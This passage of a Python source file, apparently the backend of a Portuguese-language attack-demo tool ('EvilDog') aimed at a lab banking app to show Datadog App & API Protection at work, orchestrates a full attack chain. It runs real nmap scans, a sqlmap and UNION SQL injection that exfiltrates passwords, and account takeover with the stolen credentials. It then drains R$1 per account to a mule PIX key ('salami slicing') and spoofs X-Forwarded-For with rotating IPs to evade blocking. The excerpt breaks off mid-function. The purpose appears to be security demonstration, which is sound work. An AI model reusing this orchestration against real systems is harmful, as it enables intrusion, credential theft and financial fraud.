                     "micro-depósitos de verificação (centavos cada), somando ~US$ 50 mil. Foi "
                     "DETECTADO pela própria monitoração dos bancos (E*TRADE, Charles Schwab), que "
                     "acionaram a polícia — 15 meses de prisão + US$ 200 mil de restituição.",
        "detection": "Fan-in de muitos micro-PIX para uma única chave, de contas distintas, num "
                     "curto intervalo — padrão detectável no Cloud SIEM.",
        "reference": "https://www.helpnetsecurity.com/2008/05/30/internet-scheme-used-to-steal-micro-deposits/",
    },
]


def _postexploit_drain_all(amount: float = 1.0) -> dict:
    """The 'robot': login into every account and siphon `amount` to the mule key.
    Uses unique idempotency keys so it can be re-run — a fan-out of micro-PIX to a
    single destination (a classic money-mule / structuring pattern for SIEM)."""
    hdr = dict(attacker.session.headers)
    run = uuid.uuid4().hex[:8]
    to = DRAIN_KEY
    cpfs = [r.get("cpf") for r in API_STATE["loot_records"] if r.get("cpf")] or DRAIN_CPFS
    cpfs = list(dict.fromkeys(cpfs))
    total, results = 0.0, []
    bus.publish({"level": "warn", "node": "EXTRACT",
                 "message": f"[DRAIN] robô iniciado — R$ {amount:.2f} de {len(cpfs)} contas → {to}"})
    bus.publish({"level": "info", "node": "EXTRACT",
                 "message": "[DRAIN] técnica: salami slicing — ref. caso Michael Largent 2008 "
                            "(~US$50k em micro-desvios, detectado pela monitoração dos bancos)"})
    for cpf in cpfs:
        try:
            # Resolve o accountId via LOOKUP (sem /login) para não tropeçar no rate limiter.
            # O lookup fica no auth-service (/api/users) e NÃO é exposto pelo ingress público
            # (que roteia só /api/auth, /api/transactions, ...), então chamamos o serviço
            # direto in-cluster — pós-exploração, o atacante já está dentro.
            ur = requests.get(f"{AUTH_SERVICE_URL}/api/users/cpf/{cpf}", headers=hdr, timeout=10)
            acc = None
            try:
                acc = ur.json().get("id")
            except Exception:
                pass
            if not acc:
                results.append({"cpf": cpf, "ok": False, "error": f"lookup falhou (HTTP {ur.status_code})"})
                continue
            rp = requests.post(_svc("/api/transactions/pix"),
                               json={"accountOriginId": acc, "pixKeyDestination": to,
                                     "amount": amount, "password": "123456", "description": "ajuste tarifa"},
                               headers={**hdr, "X-Idempotency-Key": f"evildog-drain-{run}-{acc}"}, timeout=25)
            ok = rp.status_code in (200, 201)
            if ok:
                total += amount
                API_STATE["pix_stolen"].append({"amount": amount, "to": to, "from_account": acc})
                API_STATE["compromised"].add("transaction-service")
            results.append({"cpf": cpf, "account": acc, "ok": ok, "http_status": rp.status_code})
            bus.publish({"level": "success" if ok else "warn", "node": "EXTRACT",
                         "message": f"[DRAIN] R$ {amount:.2f} conta {acc} → {to} "
                                    f"({'ok' if ok else 'HTTP ' + str(rp.status_code)})"})
            time.sleep(0.15)
        except Exception as exc:
            results.append({"cpf": cpf, "ok": False, "error": str(exc)})
    hits = sum(1 for r in results if r.get("ok"))
    bus.publish({"level": "critical", "node": "EXTRACT",
                 "message": f"[DRAIN] TOTAL desviado: R$ {total:.2f} de {hits} contas → {to} "
                            f"(padrão salami slicing — o Cloud SIEM deve detectar o fan-in)"})
    return {"ok": True, "to": to, "amount_per_account": amount, "accounts": len(results),
            "drained_ok": hits, "total": total, "results": results, "case_study": SALAMI_CASES}


POSTEXPLOIT_ACTIONS = [
    {"id": "drain-all", "label": "Desviar R$1 de CADA conta (robô)", "danger": "critical",
     "desc": "Salami slicing: desvia R$1 de cada conta para a conta-laranja (ref. caso Largent 2008)."},
    {"id": "pix", "label": "Realizar PIX (roubar dinheiro)", "danger": "critical",
     "desc": "Transfere um PIX de alto valor de uma conta comprometida."},
    {"id": "export-data", "label": "Exportar dados sensíveis", "danger": "critical",
     "desc": "Dump completo de clientes (nome, CPF, saldo, chave PIX) via SQLi."},
    {"id": "dump-secrets", "label": "Extrair segredos / credenciais", "danger": "high",
     "desc": "Exfiltra a senha do banco via Log4Shell (callback)."},
    {"id": "drain", "label": "Drenar conta (PIX máximo)", "danger": "critical",
     "desc": "Esvazia a conta comprometida em uma transferência."},
]


# Map vector id -> the attacker method that generates the real malicious traffic.
_ATTACKER_METHODS = {
    "sqli": lambda: attacker.attack_sql_injection(),
    "log4shell": lambda: attacker.attack_log4shell(),
    "credential-stuffing": lambda: attacker.attack_credential_stuffing(),
    "xss": lambda: attacker.attack_xss(),
    "idor": lambda: attacker.attack_idor(),
    "rce": lambda: attacker.attack_rce(),
    "path-traversal": lambda: attacker.attack_path_traversal(),
    "auth-bypass": lambda: attacker.attack_auth_bypass(),
}


def _run_vector(vector: str) -> dict:
    """Blocking: run one attack vector and return structured result."""
    attacker.stats["total_attacks"] += 1
    result: dict = {"vector": vector, "ok": True}

    # Structured impact for the two hero vectors.
    if vector == "sqli":
        result.update(_run_sqli_exfil())
    elif vector == "log4shell":
        result.update(_run_log4shell_exfil())

    # Always generate the recognizable malicious traffic (flags in Datadog AAP).
    method = _ATTACKER_METHODS.get(vector)
    if method:
        try:
            method()
        except Exception as exc:
            bus.publish({"level": "critical", "message": f"[{vector}] erro: {exc}"})
            result["ok"] = False
            result["error"] = str(exc)

    if vector == "credential-stuffing" and attacker.stats.get("stuffing_success", 0) > 0:
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("auth-service")
    return result


# --------------------------------------------------------------------------- #
# Pipeline (Attack Orchestrator) — RECON..EXTRACT with node-state events      #
# --------------------------------------------------------------------------- #
PIPELINE_NODES = ["RECON", "SCAN", "DETECT", "PAYLOAD", "INJECT", "ATO", "TRANSFER", "REPORT"]

# Tempo mínimo (s) que cada estágio fica "active" — dá a sensação de execução real (não pisca).
STAGE_MIN_DWELL = float(os.getenv("EVILDOG_STAGE_DWELL", "3.5"))
# Remote Configuration is eventually consistent. In the real demo stack we
# have observed a valid Datadog block taking ~48s to reach the Java tracer.
# Keep the attack parked in the harmless enforcement probe long enough for the
# first post-block click to be deterministic instead of leaking into SQLi/ATO.
BLOCK_SYNC_GRACE_S = float(os.getenv("EVILDOG_BLOCK_SYNC_GRACE_S", "90"))
BLOCK_SYNC_POLL_S = float(os.getenv("EVILDOG_BLOCK_SYNC_POLL_S", "0.5"))
# Alvos in-cluster do nmap (nome do serviço + portas)
_NMAP_HOSTS = os.getenv("EVILDOG_NMAP_HOSTS", "auth-service transaction-service account-service").split()
_NMAP_PORTS = os.getenv("EVILDOG_NMAP_PORTS", "8088,8084,8089,8091")


def _node(node: str, state: str, message: str = "") -> None:
    API_STATE["last_pipeline"][node] = state
    bus.publish({"type": "node", "node": node, "state": state,
                 "run_id": _RUN_ID.get() or API_STATE["pipeline"].get("run_id"),
                 "source_ip": _RUN_SOURCE_IP.get() or API_STATE["pipeline"].get("source_ip"),
                 "level": "success" if state == "success" else ("critical" if state == "fail" else "info"),
                 "message": message or f"{node}: {state}"})


class PipelineOutcomeError(Exception):
    """Erro terminal com classificação explícita para a UI e para o run state."""
    outcome = "BACKEND_ERROR"


class BlockedError(PipelineOutcomeError):
    """Bloqueio que pode ser atribuído à AAP com evidência na resposta."""
    outcome = "AAP_BLOCKED"


class UserBlockedError(PipelineOutcomeError):
    """A aplicação negou a operação porque a conta foi contida pelo workflow."""
    outcome = "USER_BLOCKED"


class RateLimitedError(PipelineOutcomeError):
    outcome = "RATE_LIMITED"


class BackendError(PipelineOutcomeError):
    outcome = "BACKEND_ERROR"


def _source_ip() -> str:
    """IP de origem que o alvo/AAP enxerga para este atacante. Se houver IP spoofado
    (X-Forwarded-For), é ELE que a AAP usa como client_ip — é o IP a bloquear."""
    run_ip = _RUN_SOURCE_IP.get()
    if run_ip:
        return run_ip
    if _SPOOF["ip"]:
        return _SPOOF["ip"]
    ip = os.getenv("POD_IP")
    if ip:
        return ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "desconhecido"


def _response_text(resp) -> str:
    try:
        return (resp.text or "").lower()
    except Exception:
        return ""


def _response_has_aap_evidence(resp) -> bool:
    """Não inferir AAP a partir de um 403 genérico.

    Um bloqueio é creditado à Datadog apenas quando a resposta expõe um marcador
    de AppSec/Datadog.  Antes disso, respostas de conta bloqueada são identificadas
    separadamente; uma negativa sem evidência vira erro de backend/integração,
    nunca um falso "AAP bloqueou" no roteiro.
    """
    if resp is None:
        return False
    headers = {str(k).lower(): str(v).lower() for k, v in resp.headers.items()}
    if any(k.startswith("x-datadog") for k in headers):
        return True
    text = _response_text(resp)
    markers = ("datadog", "appsec", "app & api protection", "security blocked", "waf blocked")
    return any(marker in text for marker in markers)


def _response_is_user_blocked(resp) -> bool:
    if resp is None or resp.status_code != 403:
        return False
    text = _response_text(resp)
    # Contrato do auth-service: login de conta contida retorna 403 com mensagem
    # contendo blocked/bloqueado.  Não confundir com a página da AAP.
    return any(marker in text for marker in (
        "user_blocked",
        "user blocked",
        "account_blocked",
        "account temporarily blocked",
        "suspicious activity",
        "usuário bloqueado",
        "usuario bloqueado",
        "conta bloqueada",
        "bloqueado",
    ))


def _classify_response(resp) -> Optional[PipelineOutcomeError]:
    if resp is None:
        return BackendError("resposta HTTP ausente")
    url = getattr(resp, "url", "target")
    if resp.status_code == 429:
        return RateLimitedError(f"HTTP 429 em {url}")
    if resp.status_code in (403, 406) and _response_has_aap_evidence(resp):
        return BlockedError(f"HTTP {resp.status_code} (AAP) em {url}")
    if _response_is_user_blocked(resp):
        return UserBlockedError(f"HTTP 403 (usuário bloqueado) em {url}")
    if resp.status_code >= 500:
        return BackendError(f"HTTP {resp.status_code} em {url}")
    # Um 403/406 sem sinalização inequívoca não pode ser anunciado como AAP.
    if resp.status_code in (403, 406):
        return BackendError(f"HTTP {resp.status_code} sem evidência AAP em {url}")
    return None


def _pipe_request(method: str, url: str, xff: str = None, **kw):
    """Wrapper HTTP com classificação conservadora de resultados de segurança.

    Se não houver `xff`, uma execução principal usa obrigatoriamente o IP congelado
    no ContextVar.  `xff` continua existindo para os ramos/agents independentes.
    """
    headers = dict(kw.pop("headers", None) or attacker.session.headers)
    source_ip = xff or _RUN_SOURCE_IP.get()
    if source_ip:
        for h in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP"):
            headers[h] = source_ip
    kw.setdefault("timeout", 15)
    try:
        resp = requests.request(method, url, headers=headers, **kw)
    except requests.RequestException as exc:
        raise BackendError(f"falha HTTP em {url}: {exc}") from exc
    classification = _classify_response(resp)
    if classification:
        raise classification
    return resp


def _source_ip_is_available(source_ip: str) -> bool:
    """Return whether a source IP is safe to use for the first act of a demo.

    This is deliberately a benign request with a browser-like User-Agent.  It
    verifies only an active AAP denylist entry; it must not create a new
    attack-tool signal or match the SQLi rule while preparing the take.
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (DogBank demo readiness check)",
        "Accept": "application/json",
    }
    for name in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP"):
        headers[name] = source_ip
    try:
        response = requests.get(
            _svc("/api/transactions/validate-pix-key"),
            # Use the seeded lab receiver so the endpoint contract itself is
            # HTTP 200. A made-up PIX key correctly returns 400 and would make
            # availability indistinguishable from an application error.
            params={"pixKey": DRAIN_KEY},
            headers=headers,
            timeout=SOURCE_IP_PREFLIGHT_TIMEOUT_S,
        )
    except requests.RequestException as exc:
        raise BackendError(f"preflight HTTP indisponível: {exc}") from exc

    classification = _classify_response(response)
    if isinstance(classification, BlockedError):
        return False
    if classification:
        raise classification
    if response.status_code != 200:
        raise BackendError(
            f"preflight esperava HTTP 200, recebeu HTTP {response.status_code} em {response.url}"
        )
    return True


def _ensure_available_source_ip() -> dict:
    """Keep a fresh take from inheriting an IP that is still denylisted.

    A retry of the *same* take must retain its IP so the presenter can prove
    enforcement.  This helper is therefore called only by `/reset` (Novo
    Take), never by `/pipeline/run`.
    """
    original_ip = _source_ip()
    source_ip = original_ip
    attempts = max(1, SOURCE_IP_PREFLIGHT_ATTEMPTS)
    for attempt in range(1, attempts + 1):
        try:
            if _source_ip_is_available(source_ip):
                return {
                    "status": "ready",
                    "source_ip": source_ip,
                    "previous_source_ip": original_ip if source_ip != original_ip else None,
                    "rotated": source_ip != original_ip,
                    "attempts": attempt,
                }
        except PipelineOutcomeError as exc:
            # A backend outage must remain visible and must not trigger a storm
            # of random identities. The reset still clears UI/application state.
            return {
                "status": "unverified",
                "source_ip": source_ip,
                "previous_source_ip": None,
                "rotated": source_ip != original_ip,
                "attempts": attempt,
                "detail": str(exc),
            }
        if attempt < attempts:
            source_ip = rotate_source_ip()

    return {
        "status": "blocked",
        "source_ip": source_ip,
        "previous_source_ip": original_ip,
        "rotated": source_ip != original_ip,
        "attempts": attempts,
        "detail": "todos os IPs candidatos ainda foram barrados pela AAP",
    }


def _await_aap_enforcement(source_ip: str, grace_s: float = BLOCK_SYNC_GRACE_S,
                           poll_s: float = BLOCK_SYNC_POLL_S) -> bool:
    """Dá tempo para a denylist remota chegar ao tracer antes de repetir o ataque.

    A verificação continua sendo real: somente um 403 com evidência AAP interrompe
    a pipeline. Não existe bloqueio local simulado. Se a configuração ainda não
    estiver ativa ao fim da janela, a execução segue normalmente.
    """
    deadline = time.monotonic() + max(0.0, grace_s)
    attempts = 0
    while True:
        attempts += 1
        _pipe_request(
            "GET",
            _svc("/api/transactions/validate-pix-key") + "?pixKey=enforcement-probe",
            xff=source_ip,
            timeout=8,
        )
        if time.monotonic() >= deadline:
            return False
        # Keep retry details in backend diagnostics. Repeating one line per
        # probe in the presenter feed made a real Remote Configuration wait
        # look like a mocked animation.
        if attempts == 1 or attempts % 20 == 0:
            logger.info("[AAP] enforcement pending ip=%s attempt=%d", source_ip, attempts)
        time.sleep(max(0.05, poll_s))


def _run_tool(cmd: list, node: str, label: str, timeout: int = 20, max_lines: int = 8) -> tuple:
    """Roda uma ferramenta hacker REAL (nmap/sqlmap) e transmite a saída no feed ao vivo."""
    exe = cmd[0]
    if not shutil.which(exe):
        bus.publish({"level": "warn", "node": node,
                     "message": f"[{label}] {exe} indisponível na imagem — pulando execução real"})
        return (127, "")
    bus.publish({"level": "info", "node": node, "message": f"[{label}] $ {' '.join(cmd)}"})
    lines = []
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        start = time.monotonic()
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue
            lines.append(line)
            if len(lines) <= max_lines:
                bus.publish({"level": "info", "node": node, "message": f"[{label}] {line[:150]}"})
            if time.monotonic() - start > timeout:
                proc.kill()
                bus.publish({"level": "warn", "node": node,
                             "message": f"[{label}] timeout {timeout}s — encerrando"})
                break
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        return (proc.returncode or 0, "\n".join(lines))
    except Exception as exc:
        bus.publish({"level": "warn", "node": node, "message": f"[{label}] erro: {exc}"})
        return (1, "\n".join(lines))


def _stage(node: str, label: str) -> float:
    """Marca o nó como ativo e retorna o instante de início (para o dwell)."""
    _node(node, "active", f"[{label}] iniciando…")
    return time.monotonic()


def _dwell(since: float) -> None:
    """Segura o estágio pelo tempo mínimo para dar a sensação de execução real."""
    remaining = STAGE_MIN_DWELL - (time.monotonic() - since)
    if remaining > 0:
        time.sleep(remaining)


def _ato_transfer(amount: float = 1.0) -> dict:
    """Fecha a cadeia com a credencial ROUBADA. MFA muda o jogo: o ATO por senha direta
    SÓ funciona em contas SEM MFA — as com MFA resistem (não é tão fácil assim). Depois,
    TRANSFER faz salami: desvia R$1 de CADA conta sem MFA (abaixo do radar)."""
    # Exclui a própria conta-laranja (mule) dos alvos — o atacante não drena o próprio destino.
    creds = [r for r in API_STATE["loot_records"]
             if r.get("senha") and r.get("cpf") and r.get("chave_pix") != DRAIN_KEY]
    if not creds:
        raise RuntimeError("nenhuma credencial exfiltrada disponível (rode o SQLi antes)")
    non_mfa = [r for r in creds if not r.get("mfa")]
    mfa_on = [r for r in creds if r.get("mfa")]

    # 1) ATO — só contas SEM MFA caem no ataque de senha direta
    st = _stage("ATO", "ATO")
    if mfa_on:
        bus.publish({"level": "warn", "node": "ATO",
                     "message": f"[ATO] {len(mfa_on)} conta(s) COM MFA resistiram ao ataque de senha direta — puladas"})
    if not non_mfa:
        _dwell(st)
        _node("ATO", "fail", "[ATO] todas as contas exfiltradas têm MFA — ATO por senha bloqueado 🔒")
        raise RuntimeError("todas as contas exfiltradas têm MFA")
    v0 = random.choice(non_mfa)
    bus.publish({"level": "warn", "node": "ATO",
                 "message": f"[ATO] login como {v0.get('nome','vítima')} (CPF {v0['cpf'][:3]}***) — SEM MFA, a senha roubada basta"})
    lr = _pipe_request("POST", _svc("/api/auth/login"), json={"cpf": v0["cpf"], "senha": v0["senha"]})
    if lr.status_code not in (200, 201, 429):
        _node("ATO", "fail", f"[ATO] login recusado (HTTP {lr.status_code})")
        raise RuntimeError(f"ATO falhou (HTTP {lr.status_code})")
    _dwell(st)
    _node("ATO", "success", f"[ATO] {len(non_mfa)} conta(s) SEM MFA comprometida(s) com senha roubada ✅")
    API_STATE["compromised"].add("auth-service")

    # 2) TRANSFER — salami: R$1 de CADA conta sem MFA (fica abaixo do radar)
    st = _stage("TRANSFER", "TRANSFER")
    to = DRAIN_KEY
    bus.publish({"level": "critical", "node": "TRANSFER",
                 "message": f"[TRANSFER] salami: desviando R$ {amount:.2f} de {len(non_mfa)} conta(s) sem MFA → {to} (abaixo do radar)"})
    hits, total = 0, 0.0
    for v in non_mfa:
        try:
            ur = _pipe_request("GET", f"{AUTH_SERVICE_URL}/api/users/cpf/{v['cpf']}")
            acc = ur.json().get("id")
            rp = _pipe_request("POST", _svc("/api/transactions/pix"),
                               json={"accountOriginId": acc, "pixKeyDestination": to, "amount": amount,
                                     "password": v["senha"], "description": "ajuste tarifa"},
                               headers={**dict(attacker.session.headers),
                                        "X-Idempotency-Key": f"evildog-ato-{uuid.uuid4().hex[:10]}"}, timeout=25)
            if rp.status_code in (200, 201):
                hits += 1
                total += amount
                bus.publish({"level": "success", "node": "TRANSFER",
                             "message": f"[TRANSFER] R$ {amount:.2f} de {v.get('nome','?')} → {to}"})
        except PipelineOutcomeError:
            raise
        except Exception as exc:
            bus.publish({"level": "warn", "node": "TRANSFER", "message": f"[TRANSFER] {v.get('nome','?')}: {exc}"})
        time.sleep(0.1)
    if hits:
        API_STATE["pix_stolen"].append({"amount": total, "to": to, "from_account": f"{hits} contas"})
        API_STATE["compromised"].add("transaction-service")
    _dwell(st)
    _node("TRANSFER", "success" if hits else "fail",
          f"[TRANSFER] salami: R$ {total:.2f} de {hits}/{len(non_mfa)} conta(s) sem MFA → {to}")
    return {"ok": hits > 0, "accounts": len(non_mfa), "mfa_protected": len(mfa_on),
            "drained_ok": hits, "total": total, "to": to}


def _run_pipeline(run_id: str, source_ip: Optional[str] = None,
                  verify_enforcement: bool = False) -> str:
    """Pipeline bloqueante: emite estados dos nós + tráfego de ataque REAL (nmap/sqlmap/SQLi).
    Cada estágio usa ferramentas reais e dura ~STAGE_MIN_DWELL s. Se a AAP bloquear o IP do
    atacante (403), o nó ativo falha e a pipeline PARA."""
    # Capture before entering the worker: every request below inherits this exact
    # identity, independent of future calls to /rotate-ip.
    src = source_ip or _source_ip()
    run_token = _RUN_ID.set(run_id)
    source_token = _RUN_SOURCE_IP.set(src)
    if API_STATE["pipeline"].get("run_id") != run_id or not _pipeline_active():
        _start_pipeline_state(run_id, src)
    bus.publish({"type": "pipeline", "state": "running", "run_id": run_id,
                 "source_ip": src, "outcome": None})
    try:
        # RECON — origem do ataque + nmap discovery + probe HTTP (é aqui que um IP bloqueado bate em 403)
        st = _stage("RECON", "RECON")
        bus.publish({"level": "warn", "node": "RECON",
                     "message": f"[RECON] origem do ataque: {src} — bloqueie ESTE IP na Datadog (AAP) para interromper"})
        if verify_enforcement:
            bus.publish({"level": "info", "node": "RECON",
                         "message": f"[AAP] validando a política de proteção para o IP {src}"})
            _await_aap_enforcement(src)
        recon_rc, _ = _run_tool(["nmap", "--unprivileged", "-sn", "-n"] + _NMAP_HOSTS,
                                "RECON", "nmap", timeout=8, max_lines=6)
        if recon_rc != 0:
            raise BackendError(f"nmap discovery falhou (exit code {recon_rc})")
        # Probe pelo MESMO caminho (ingress → transaction-service) que os estágios de exploração
        # usam. Assim, se a AAP bloqueou o IP do atacante, o 403 é detectado JÁ no recon (e não
        # só na transferência). Sondamos os dois serviços protegíveis via ingress.
        encoded_receiver = requests.utils.quote(DRAIN_KEY, safe="")
        for probe in (
            _svc("/api/transactions/validate-pix-key") + f"?pixKey={encoded_receiver}",
            _svc("/api/auth/pix-key/") + encoded_receiver,
        ):
            response = _pipe_request("GET", probe, timeout=8)
            if response.status_code != 200:
                raise BackendError(
                    f"RECON esperava HTTP 200, recebeu HTTP {response.status_code} em {response.url}"
                )
        _dwell(st)
        _node("RECON", "success", f"[RECON] alvo mapeado ({TARGET_LABEL}) · origem {src}")

        # SCAN — nmap service/version scan REAL
        st = _stage("SCAN", "SCAN")
        scan_rc, _ = _run_tool(
            ["nmap", "--unprivileged", "-sT", "-sV", "-Pn", "-n", "-T4", "-p", _NMAP_PORTS] + _NMAP_HOSTS,
            "SCAN", "nmap", timeout=13, max_lines=8,
        )
        if scan_rc != 0:
            raise BackendError(f"nmap service scan falhou (exit code {scan_rc})")
        _dwell(st)
        _node("SCAN", "success", f"[SCAN] portas expostas: {_NMAP_PORTS}")

        # DETECT — sqlmap REAL confirma a injeção (+ UNION exfil confirma e popula o loot)
        st = _stage("DETECT", "DETECT")
        sqli_url = _svc("/api/transactions/validate-pix-key") + "?pixKey=1"
        _, out = _run_tool(["sqlmap", "-u", sqli_url, "-p", "pixKey", "--batch", "--technique=U",
                            "--level=1", "--risk=1", "--dbms=postgresql", "--flush-session",
                            "--timeout=3", "--retries=1", "--disable-coloring",
                            "-H", f"X-Forwarded-For: {src}"],
                           "DETECT", "sqlmap", timeout=14, max_lines=10)
        sqli = _run_sqli_exfil()
        vulnerable = bool(sqli.get("records_leaked")) or "injectable" in out.lower() or "vulnerable" in out.lower()
        _dwell(st)
        _node("DETECT", "success" if vulnerable else "fail",
              "[DETECT] SQL Injection confirmada (sqlmap + UNION)" if vulnerable else "[DETECT] alvo aparentemente seguro")
        if not vulnerable:
            _node("REPORT", "success", "[REPORT] nenhum exploit executado (SKIP)")
            detail = "nenhum exploit executado"
            _finish_pipeline_state("done", "NO_EXPLOIT", detail)
            bus.publish({"type": "pipeline", "state": "done", "run_id": run_id,
                         "source_ip": src, "outcome": "NO_EXPLOIT", "message": detail})
            return "done"

        # PAYLOAD — monta o UNION SELECT que exfiltra as credenciais
        st = _stage("PAYLOAD", "PAYLOAD")
        bus.publish({"level": "info", "node": "PAYLOAD", "message": f"[PAYLOAD] {SQLI_EXFIL_PAYLOAD[:90]}…"})
        _dwell(st)
        _node("PAYLOAD", "success", "[PAYLOAD] UNION SELECT nome,email,cpf:senha,saldo,banco,chave")

        # INJECT — SQLi UNION real: exfiltra registros COM SENHA
        st = _stage("INJECT", "INJECT")
        attacker.stats["total_attacks"] += 1
        records = sqli.get("records_leaked", 0)
        pw_count = sum(1 for r in API_STATE["loot_records"] if r.get("senha"))
        _dwell(st)
        if not records:
            # pw_count vem do loot ACUMULADO de execuções anteriores: sem este guard o nó
            # exibia "N SENHAS exfiltradas" de loot velho numa injeção que não vazou nada.
            _node("INJECT", "fail", f"[INJECT] injeção não retornou registros "
                                    f"(HTTP {sqli.get('http_status')}) — nada exfiltrado nesta execução")
            raise RuntimeError(f"SQLi sem registros (HTTP {sqli.get('http_status')})")
        _node("INJECT", "success", f"[INJECT] {records} registros + {pw_count} SENHAS reais exfiltradas")

        # ATO + TRANSFER — credencial ROUBADA em contas SEM MFA + salami R$1/conta
        res = _ato_transfer(amount=1.0)

        _node("REPORT", "success",
              f"[REPORT] cadeia: SQLi → credenciais → ATO (sem MFA) → salami R$ {res['total']:.2f} "
              f"de {res['drained_ok']} conta(s) · {res['mfa_protected']} com MFA resistiram")
        detail = "[REPORT] pipeline concluído — salami com credencial roubada (contas sem MFA)"
        _finish_pipeline_state("done", "SUCCESS", detail)
        bus.publish({"type": "pipeline", "state": "done", "run_id": run_id, "source_ip": src,
                     "outcome": "SUCCESS", "level": "success", "message": detail})
        return "done"
    except BlockedError as exc:
        # "bloqueou a requisição", não "bloqueou o IP": a AAP pode barrar por regra de
        # padrão de ataque (que pega qualquer IP, inclusive um recém-rotacionado) ou por
        # denylist de IP. Afirmar "IP bloqueado" era enganoso no primeiro caso -- que é
        # justamente o mais forte da demo, porque o rotate-IP não evade.
        attacker.stats["blocked"] += 1
        active = next((n for n in PIPELINE_NODES if API_STATE["last_pipeline"].get(n) == "active"), "RECON")
        _node(active, "fail", f"🛡️ [BLOQUEADO] requisição do IP {src} barrada pela Datadog (AAP) — {exc}")
        detail = f"🛡️ ATAQUE INTERROMPIDO — a Datadog (App & API Protection) barrou a requisição do IP {src}. {exc}"
        _finish_pipeline_state("blocked", exc.outcome, detail)
        bus.publish({"type": "pipeline", "state": "blocked", "run_id": run_id, "source_ip": src,
                     "outcome": exc.outcome, "level": "critical",
                     "message": f"🛡️ ATAQUE INTERROMPIDO — a Datadog (App & API Protection) barrou a "
                                f"requisição do IP {src}. {exc}"})
        return "blocked"
    except UserBlockedError as exc:
        active = next((n for n in PIPELINE_NODES if API_STATE["last_pipeline"].get(n) == "active"), "ATO")
        _node(active, "fail", f"🛡️ [CONTIDO] usuário bloqueado pela automação — {exc}")
        detail = f"🛡️ ATAQUE CONTIDO — workflow bloqueou o usuário da aplicação. {exc}"
        _finish_pipeline_state("blocked", exc.outcome, detail)
        bus.publish({"type": "pipeline", "state": "blocked", "run_id": run_id, "source_ip": src,
                     "outcome": exc.outcome, "level": "critical", "message": detail})
        return "blocked"
    except RateLimitedError as exc:
        active = next((n for n in PIPELINE_NODES if API_STATE["last_pipeline"].get(n) == "active"), None)
        if active:
            _node(active, "fail", f"[RATE LIMIT] {exc}")
        detail = f"pipeline limitado por rate limit: {exc}"
        _finish_pipeline_state("error", exc.outcome, detail)
        bus.publish({"type": "pipeline", "state": "error", "run_id": run_id, "source_ip": src,
                     "outcome": exc.outcome, "level": "critical", "message": detail})
        return "error"
    except BackendError as exc:
        active = next((n for n in PIPELINE_NODES if API_STATE["last_pipeline"].get(n) == "active"), None)
        if active:
            _node(active, "fail", f"[BACKEND ERROR] {exc}")
        detail = f"pipeline erro de backend: {exc}"
        _finish_pipeline_state("error", exc.outcome, detail)
        bus.publish({"type": "pipeline", "state": "error", "run_id": run_id, "source_ip": src,
                     "outcome": exc.outcome, "level": "critical", "message": detail})
        return "error"
    except Exception as exc:
        active = next((n for n in PIPELINE_NODES if API_STATE["last_pipeline"].get(n) == "active"), None)
        if active:
            _node(active, "fail", f"[ERRO] {exc}")
        detail = f"pipeline erro: {exc}"
        _finish_pipeline_state("error", "BACKEND_ERROR", detail)
        bus.publish({"type": "pipeline", "state": "error", "run_id": run_id, "source_ip": src,
                     "outcome": "BACKEND_ERROR", "level": "critical", "message": detail})
        return "error"
    finally:
        _RUN_SOURCE_IP.reset(source_token)
        _RUN_ID.reset(run_token)


def _run_branch(branch: int, ip: str) -> None:
    """Um ramo de ESCALAÇÃO: ataque distribuído a partir de um IP spoofado distinto.
    Emite eventos 'branch_node' (lanes paralelas na UI). Reusa o loot já exfiltrado —
    recon/scan/detect são leves (a vuln já é conhecida); o foco é o salami de outro IP."""
    cur = "RECON"

    def bn(node, state, msg=""):
        nonlocal cur
        cur = node
        bus.publish({"type": "branch_node", "branch": branch, "ip": ip, "node": node, "state": state,
                     "level": "success" if state == "success" else "critical" if state == "fail" else "info",
                     "message": f"[IP {ip}] {msg}"})

    d = 1.4
    try:
        bn("RECON", "active", "recon…")
        _pipe_request("GET", _svc("/api/transactions/validate-pix-key") + "?pixKey=recon-probe", xff=ip, timeout=8)
        time.sleep(d)
        bn("RECON", "success", f"origem {ip}")
        for nd, msg in (("SCAN", "portas mapeadas"), ("DETECT", "SQLi confirmada"),
                        ("PAYLOAD", "UNION pronto"), ("INJECT", "credenciais roubadas")):
            bn(nd, "active", "…")
            time.sleep(d * 0.6)
            bn(nd, "success", msg)

        non_mfa = [r for r in API_STATE["loot_records"]
                   if r.get("senha") and r.get("cpf") and not r.get("mfa") and r.get("chave_pix") != DRAIN_KEY]
        if not non_mfa:
            bn("ATO", "fail", "sem contas sem-MFA no loot")
            raise RuntimeError("sem contas sem MFA")
        bn("ATO", "active", "login c/ senha roubada…")
        time.sleep(d)
        bn("ATO", "success", f"{len(non_mfa)} conta(s) sem MFA comprometida(s)")

        bn("TRANSFER", "active", "salami R$1/conta…")
        total, denied = 0.0, 0
        for v in non_mfa:
            try:
                ur = _pipe_request("GET", f"{AUTH_SERVICE_URL}/api/users/cpf/{v['cpf']}", xff=ip)
                acc = ur.json().get("id")
                rp = _pipe_request("POST", _svc("/api/transactions/pix"), xff=ip,
                                   json={"accountOriginId": acc, "pixKeyDestination": DRAIN_KEY, "amount": 1.0,
                                         "password": v["senha"], "description": "ajuste tarifa"},
                                   headers={**dict(attacker.session.headers),
                                            "X-Idempotency-Key": f"evildog-esc-{branch}-{uuid.uuid4().hex[:8]}"}, timeout=25)
                if rp.status_code in (200, 201):
                    total += 1.0
            except UserBlockedError:
                # Só a semântica explícita do auth-service conta como contenção.
                # 500/rate limit/AAP pertencem a resultados distintos, não a
                # "PIX negado pelo workflow".
                denied += 1
            except PipelineOutcomeError:
                raise
            except Exception as exc:
                raise BackendError(f"falha no ramo {branch}: {exc}") from exc
        if total:
            API_STATE["pix_stolen"].append({"amount": total, "to": DRAIN_KEY, "from_account": f"branch-{branch}"})
        time.sleep(d)
        if total == 0.0 and denied > 0:
